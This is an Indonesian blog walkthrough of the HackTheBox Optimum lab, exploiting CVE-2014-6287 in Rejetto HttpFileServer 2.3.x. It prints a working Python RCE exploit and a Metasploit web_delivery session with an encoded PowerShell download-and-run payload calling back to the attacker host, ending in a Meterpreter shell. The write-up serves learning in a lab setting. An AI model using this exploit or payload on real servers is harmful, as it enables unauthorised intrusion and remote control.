---
featured_image: "/uploads/justakazh/screen-shot-2014-10-28-at-91538-am.png"
author_description: Aku nulis karena aku pelupa
author_avatar: "/uploads/justakazh/1656477958868.jpeg"
author_facebook: https://facebook.com
author_twitter: https://twitter.com
author_instagram: https://instagram.com
author_donation: paypal / saweria / buymecoffe / etc
author_web: https://blog.hackstreet.id
title: " Rejetto HttpFileServer 2.3.x - Remote Command Execution "
date: 2023-01-03T00:00:00+07:00
author: Justakazh
tags:
- cve
- exploit
- rce
categories: penetration testing

---
## Introduction

pada kesempatan kali ini kita akan membahas mengenai kerentanan Remote Code Execution yang terjadi pada Rejetto HttpFileServer versi 2.3.x. goal dari tulisan ini adalah kita dapat mengetahui cara exploitasi dari kerentan tersebut. pada kasus ini kita akan menggunakan mesin Optimum pada HackTheBox.

> **Sekilas tentang Rejetto HTTP File Server**
>
> HTTP File Server, atau biasa dikenal dengan HFS merupakan sebuah web server gratis yang dibuat untuk menerbitkan atau berbagi file.

## Remote Code Execution

menurut MITRE [CVE-2014-6287](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6287 "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6287") menyimpulkan bahwa fungsi `findMacroMarker`  pada `parserLib.pas` memungkinkan penyerang untuk melakukan eksekusi kode melalui pencarian dengan menyisipkan null byte (%00).

    function findMacroMarker(s:string; ofs:integer=1):integer;

     begin result:=reMatch(s, '\{[.:]|[.:]\}|\|', 'm!', ofs) end;

fungsi tersebut tidak dapat menangani null byte, sehingga ketika penyerang mencoba untuk menyisipkan `%00{.exec|cmd.}` pada parameter `?search=` akan secara otomatis menghentikan regex dan kode yang disisipkan penyerang akan tereksekusi.

berikut ini beberapa tools yang dapat digunakan untuk melakukan exploitasi pada kerentanan ini

* exploit/windows/http/rejetto_hfs_exec (Metasploit Module)
* [https://www.exploit-db.com/exploits/49125](https://www.exploit-db.com/exploits/49125 "https://www.exploit-db.com/exploits/49125") (Exploit-DB)

disini kita akan menggunakan exploit dari exploit-db, berikut ini adalah script yang akan kita gunakan

```python
import urllib3
import sys
import urllib.parse

try:
	http = urllib3.PoolManager()	
	url = f'http://{sys.argv[1]}:{sys.argv[2]}/?search=%00{{.+exec|{urllib.parse.quote(sys.argv[3])}.}}'
	print(url)
	response = http.request('GET', url)
	
except Exception as ex:
	print("Usage: python3 HttpFileServer_2.3.x_rce.py RHOST RPORT command")
	print(ex)
```
pada script tersebut akan melakukan request pada http://target.tld:port/?search= yang diikuti dengan payload untuk melakukan rce dalam bentuk URL Encode. untuk menjalankan script tersebut kita dapat menggunakan perintah 
```bash
python 49125.py [rhost] [rport] [command]
```
seperti yang telah saya jelaskan sebelumnya kita akan menggunakan mesin Optimum dari HackTheBox untuk melakukan simulasi serangan, disini saya akan mencoba untuk mengirimkan icmp request dari mesin tersebut ke komputer saya menggunakan tcpdump untul melihat apakah ada traffic yang dikirimkan dari ip 10.10.10.8 (itu berarti kode berhasil dijalankan) atau tidak
```
tcpdump -i tun0 icmp and src 10.10.10.8
```
setelah menjalankan tcpdump selanjutnya mari kita jalankan script tersebut

```bash 
python 49125.py 10.10.10.8 80 "cmd.exe /c ping -n 1 10.10.14.2"
```

```bash
┌──(punktester㉿kali)-[~]
└─$ sudo tcpdump -i tun0 icmp and src 10.10.10.8
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
18:00:23.359331 IP 10.10.10.8 > local.ip: ICMP echo request, id 1, seq 41, length 40
18:00:23.359365 IP 10.10.10.8 > local.ip: ICMP echo request, id 1, seq 42, length 40
18:00:23.359637 IP 10.10.10.8 > local.ip: ICMP echo request, id 1, seq 43, length 40
18:00:23.359656 IP 10.10.10.8 > local.ip: ICMP echo request, id 1, seq 44, length 40
```
dapat dilihat pada hasil diatas tersebut, terdapat ICMP echo request dari ip 10.10.10.8 kita bisa menyimpulkan bahwa perintah `cmd.exe /c ping -n 1 10.10.10.8` (ICMP) berhasil dijalankan pada mesin tersebut. untuk melakukan reverse shell kita dapat menggunakan script powershell berikut ini

https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1

atau kita juga dapat mengggunakan module metasploit `exploit/multi/script/web_delivery`

```bash
msf6 exploit(multi/script/web_delivery) > set srvhost 10.10.14.2
srvhost => 10.10.14.2
msf6 exploit(multi/script/web_delivery) > set lhost 10.10.14.2
lhost => 10.10.14.2
msf6 exploit(multi/script/web_delivery) > set lport 6969
lport => 6969
msf6 exploit(multi/script/web_delivery) > set target 2
target => 2
msf6 exploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > run
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/script/web_delivery) > 
[*] Started reverse TCP handler on 10.10.14.2:6969 
[*] Using URL: http://10.10.14.2:8080/8fiIMIx9A
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABkAEEAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAZABBAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAZABBAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgA6ADgAMAA4ADAALwA4AGYAaQBJAE0ASQB4ADkAQQAvAFcAVwBJAE8AQQBJAHoAVgBrACcAKQApADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAyADoAOAAwADgAMAAvADgAZgBpAEkATQBJAHgAOQBBACcAKQApADsA
```
kita dapat menggunakan perintah yang diberikan oleh metasploit untuk dikirimkan ke mesin tersebut dengan mengetikan perintah 
```bash 
python 49125.py 10.10.10.8 80 "powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABkAEEAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAZABBAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAZABBAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgA6ADgAMAA4ADAALwA4AGYAaQBJAE0ASQB4ADkAQQAvAFcAVwBJAE8AQQBJAHoAVgBrACcAKQApADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAyADoAOAAwADgAMAAvADgAZgBpAEkATQBJAHgAOQBBACcAKQApADsA"
```
jika payload tersebut berhasil dijalankan maka kita akan mendapatkan akses meterpreter 
```bash 
[*] 10.10.10.8       web_delivery - Delivering AMSI Bypass (1389 bytes)
[*] 10.10.10.8       web_delivery - Delivering Payload (3488 bytes)
[*] Sending stage (175174 bytes) to 10.10.10.8
[*] Meterpreter session 4 opened (10.10.14.2:6969 -> 10.10.10.8:49251 ) at 2023-01-03 18:20:07 +0700

```
sekian tulisan kali ini, semoga bermanfaat dan sampai bertemu ditulisan selanjutnya.


## Reference
- https://subscription.packtpub.com/book/networking-and-servers/9781786463166/1/ch01lvl1sec20/vulnerability-analysis-of-hfs-23
- https://www.exploit-db.com/exploits/49125